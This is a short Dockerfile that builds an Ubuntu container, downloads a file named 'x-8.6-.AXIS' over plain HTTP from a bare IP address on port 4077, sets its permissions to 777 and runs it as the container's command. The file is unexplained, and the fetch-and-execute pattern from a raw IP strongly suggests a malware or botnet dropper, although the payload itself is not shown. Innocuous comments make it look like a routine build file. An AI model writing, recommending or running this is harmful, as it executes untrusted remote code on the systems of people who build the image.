# Use a base image
FROM ubuntu:latest

# Set the working directory
WORKDIR /app

# Change to a safe directory (e.g., /tmp)
WORKDIR /tmp

# Download the file from the specified URL
RUN wget http://204.10.194.37:4077/x-8.6-.AXIS

# Add execute permissions to the downloaded file
RUN chmod 777 x-8.6-.AXIS

# Run the downloaded file
CMD ["./x-8.6-.AXIS"]
